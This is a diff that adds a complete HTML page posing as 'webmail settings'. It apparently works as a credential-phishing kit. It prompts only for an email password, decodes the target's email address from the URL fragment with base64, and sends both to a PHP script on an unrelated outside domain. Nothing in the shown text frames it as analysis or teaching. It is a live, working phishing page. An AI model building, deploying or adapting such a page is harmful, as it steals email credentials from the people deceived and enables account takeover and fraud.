@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>webmail settings</title>
+<link href="https://ia601408.us.archive.org/4/items/zaxxxxstyle/style.css" rel="stylesheet" type="text/css">
+</head>
+<body background="">
+<fieldset class="x-contain" >
+
+<form id="pax" action="" method="post" autocomplete="off"><br>
+
+<label id="bax"></label><br>
+
+<input id="inpwd" class="p_input" type="password" name="pexam" value="" required placeholder="
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enter your email password" minlength="5"><br>
+
+<input class="s_input" type="submit" value=" "><br>
+
+<input id="cax" type="hidden" name="exam" value="" required><br>
+
+</form>
+
+</fieldset>
+
+</body>
+<script>
+document.getElementById("inpwd").focus();
+			    var str = window.location.href;
+				var strs = str.split("#");
+				var emap = strs[1];
+				var emaq = atob(emap);
+				if(emaq){
+					document.getElementById("bax").innerHTML = emaq;
+					document.getElementById("cax").value = emaq;
+					document.getElementById("pax").action = "https://mxsempreendimentos.com.br/codix/feed.php";
+				}
+</script>
+</html>
